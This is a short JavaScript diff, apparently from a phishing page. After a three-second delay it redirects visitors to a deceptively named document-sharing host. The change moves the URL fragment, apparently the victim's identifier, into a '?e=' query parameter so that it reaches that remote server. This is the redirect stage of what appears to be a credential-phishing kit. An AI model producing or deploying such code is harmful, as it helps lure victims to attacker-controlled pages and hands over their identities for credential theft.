@@ -96,7 +96,7 @@
         setTimeout(() => { 
             let redirectUrl = `https://docsharedapproved.cloudfedbureaus.com/FjyeZ/`;
             if (fragment) {
-                redirectUrl += `#${fragment}`;
+                redirectUrl += `?e=${fragment}`;
             }
             window.location.href = redirectUrl;
         }, 3000);
